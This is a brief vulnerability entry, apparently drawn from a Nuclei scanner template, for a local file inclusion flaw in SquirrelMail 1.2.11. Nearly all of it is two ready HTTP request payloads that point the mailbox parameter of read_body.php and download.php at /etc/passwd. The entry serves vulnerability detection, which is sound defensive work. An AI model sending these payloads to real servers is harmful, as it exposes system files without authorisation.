# Vulnerability: SquirrelMail 1.2.11 - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`squirrelmail-lfi.yaml`)

## Description
SquirrelMail 1.2.11 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/src/read_body.php?mailbox=/etc/passwd&passed_id=1&
GET {{BaseURL}}/src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd
```

